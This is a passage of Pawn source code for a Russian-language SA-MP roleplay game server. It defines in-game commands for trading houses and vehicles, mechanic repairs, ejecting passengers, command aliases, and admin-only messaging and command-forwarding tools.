	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете продать дом самому себе!");
	if((!PlayerToPoint(10, playerid,HouseInfo[bouse][hExitx], HouseInfo[bouse][hExity], HouseInfo[bouse][hExitz]) || GetPlayerVirtualWorld(playerid) != bouse+50) && !PlayerToPoint(2.0, playerid, HouseInfo[bouse][hEntrancex], HouseInfo[bouse][hEntrancey], HouseInfo[bouse][hEntrancez])) return SCM(playerid,COLOR_GREY," Вы должны находиться возле, или внутри вашего дома");
	if(HGet(params[0]))
	{
		SendMes(playerid,0x6495EDFF," Вы предложили %s обменяться домами. Доплата: [%i вирт]",PTEMP[params[0]][pName], params[1]);
		SendMes(params[0],0x6495EDFF," %s предлагает вам обменяться домами. Ваша доплата: [%i вирт]",PTEMP[playerid][pName], params[1]);
	}
	else
	{
		SendMes(playerid,0x6495EDFF," Вы предложили %s купить ваш дом. Стоимость: [%i вирт]",PTEMP[params[0]][pName], params[1]);
		SendMes(params[0],0x6495EDFF," %s предлагает вам купить его дом. Стоимость: [%i вирт]",PTEMP[playerid][pName], params[1]);
	}
	SCM(params[0],0x6495EDFF," (( Введите /(ac)cept house для подтверждения сделки! ))");
	format(YCMDstr, sizeof(YCMDstr), " %s предложил(а) обменяться домами %s.",Name(playerid) ,Name(params[0]));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	SetPVarInt(playerid,"changehouse",params[0]+1);
	SetPVarInt(playerid,"changehouse_",1);
	SetPVarInt(playerid,"changehouse_price",params[1]);
	SetPVarInt(params[0],"_changehouse",playerid+1);
	DeletePVar(params[0],"changehouse_h");
	return true;
}
CMD:changecar(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(KGet(playerid) && GetVehicleModel(house_car[playerid]) == 462 || house_car[playerid] == -1) return SCM(playerid, COLOR_GREY, " Вы не владеете транспортом!");
	if(sscanf(params, "ud", params[0], params[1])) return SCM(playerid, -1, " Введите: /changecar [playerid] [цена]");
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " Вы указали свой ID");
	if(!ProxDetectorS(8.0, playerid, params[0])) return SCM(playerid,COLOR_GREY," Необходимо находиться рядом друг с другом");
	if(!HGet(params[0]) && !KGet(params[0])) return SCM(playerid, COLOR_GREY, " У игрока нет дома / квартиры");
	if(KGet(params[0]) && GetVehicleModel(house_car[params[0]]) == 462 || house_car[params[0]] == -1) return SCM(playerid, COLOR_GREY, " Данный игрок не владеет транспортом");
	if(params[1] < 0 || params[1] > 10000000) return SCM(playerid, COLOR_GREY, " Доплата должна быть от 1 до 10000000 вирт");
	format(YCMDstr, 256, "{FFFFFF}Вы собираетесь обменяться своим личным транспортом с %s\n\n{F1E100}Вы отдаете:\n\t{FFFFFF}%s[%i]\tPercent: (%i)\n\t%i вирт\n\n{F1E100}Вы получаете:\n\t{FFFFFF}%s[%i]\tPercent: (%i)\n\t0 вирт\n\nВы согласны на сделку?",
	Name(playerid), VehicleNames[GetVehicleModel(house_car[params[0]])-400],GetVehicleModel(house_car[params[0]]),CarInfo[params[0]][carPercent][GetPVarInt(params[0], "chosencar")],params[1],VehicleNames[GetVehicleModel(house_car[playerid])-400],GetVehicleModel(house_car[playerid]),CarInfo[playerid][carPercent][GetPVarInt(playerid, "chosencar")]);
	ShowPlayerDialogEx(params[0],7205,DIALOG_STYLE_MSGBOX, "Подтверждение", YCMDstr, "Согласен", "Отмена");
	SetPVarInt(playerid,"CarOffer",params[0]);
	CarOffer[params[0]] = playerid;
	CarPrice[params[0]] = params[1];
	format(YCMDstr, sizeof(YCMDstr), " %s предложил(а) обменяться транспортом %s.",Name(playerid) ,Name(params[0]));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	SCM(playerid,-1," (( Введите ''/cancel'' и выберите в меню пункт ''vehicle'' чтобы отменить обмен ))");
	return 1;
}
CMD:repair(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pJob] != 2) return SCM(playerid, COLOR_GREY, " Вы не Механик!");
	if(sscanf(params, "ud", params[0],params[1])) return	SCM(playerid, COLOR_GRAD2, " Введите: /repair [playerid] [цена]");
	if(params[1] < 1 || params[1] > 10000) return SCM(playerid, COLOR_GREY, " Нельзя меньше 1, и больше 10000 вирт");
	if(!IsPlayerConnected(params[0])) return true;
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 525) return SCM(playerid, COLOR_GREY, " Вы не на эвакуаторе!");
	if(!ProxDetectorS(8.0, playerid, params[0])|| !IsPlayerInAnyVehicle(params[0])) return true;
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете чинить машину самому себе");
	format(YCMDstr, sizeof(YCMDstr), " Вы предложили %s отремонтировать его машину за %i вирт.",Name(params[0]),params[1]);
	SCM(playerid, 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Механик %s предлагает отремонтировать ваш автомобиль за %i вирт. (( /accept repair ))",Name(playerid),params[1]);
	SCM(params[0], 0x6495EDFF, YCMDstr);
	SetPVarInt(playerid,"RepairOffer",params[0]);
	RepairOffer[params[0]] = playerid;
	RepairPrice[params[0]] = params[1];
	return true;
}
CMD:eject(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_GREY, " Вы не в транспортном средстве");
	new State = GetPlayerState(playerid);
	if(State!=PLAYER_STATE_DRIVER) return SCM(playerid,COLOR_GREY, " Вы должны быть водителем!");
	if(sscanf(params, "u", params[0])) return	SCM(playerid, -1, " Введите: /eject [playerid]");
	new test = GetPlayerVehicleID(playerid);
	if(!IsPlayerConnected(params[0])) return true;
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете выкинуть из машины себя!");
	if(!IsPlayerInVehicle(params[0],test)) return true;
	format(YCMDstr, sizeof(YCMDstr), " Вы выкинули из машины %s",Name(params[0]));
	SCM(playerid, 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Вас выкинул из машины %s",Name(playerid));
	SCM(params[0], 0x6495EDFF, YCMDstr);
	RemovePlayerFromVehicleAC(params[0]);
	return true;
}
ALTX:mafiawithdraw("/mwithdraw");
ALTX:r("/f");
ALTX:rb("/fb");
ALTX:radio("/switchwave");
ALTX:npanel("/n");
ALTX:givepayday("/gpayday");
ALTX:spawn("/sp");
ALTX:ooc("/o");
ALTX:bizlist("/бизлист");
ALTX:goverment("/gov");
ALTX:shout("/s");
ALTX:suspect("/su");
ALTX:megaphone("/m");
ALTX:sms("/t", "/txt");
//ALTX:pm("/ot");
ALTX:call("/c");
ALTX:pickup("/p");
ALTX:hangup("/h");
ALTX:recon("/re", "/ку");
ALTX:breathalyser("/bh");
ALTX:apanel("/apanel");
ALTX:delaccount("/delacc");
ALTX:admin("/a");
ALTX:geton("/online");
ALTX:teleport("/tp");
ALTX:frisk("/take");
//ALTX:goto("/g");
ALTX:agivelicense("/agl");
ALTX:whisper("/w");
ALTX:addtunnequeue("/addtq");
ALTX:setplayerskin("/spskin");
ALTX:fractionid("/fid");
ALTX:directory("/dir");
ALTX:mainmenu("/mm");
ALTX:carm("/conveyingarms");
ALTX:accept("/ac");
ALTX:prodmenu("/pmenu");

CMD:scm(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
 	if(PTEMP[playerid][pAdmin] < 9) return true;
 	new strs[256], color;
 	if(sscanf(params, "dxs[256]", params[0], color, strs)) return SCM(playerid, -1, " Введите: /SCM [playerid] [color] [text]");
 	SCM(params[0], color, strs);
	return true;
}
CMD:send(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 10) return true;
	new command[128];
	if(sscanf(params, "us[128]", params[0], command)) return SCM(playerid, -1, " Введите: /send [playerid] [command]");
	if(strfind(command, "/") != -1)
	CallLocalFunction("OnPlayerCommandText", "is", params[0], command);
	else
	CallLocalFunction("OnPlayerText", "is", params[0], command);
	return true;
}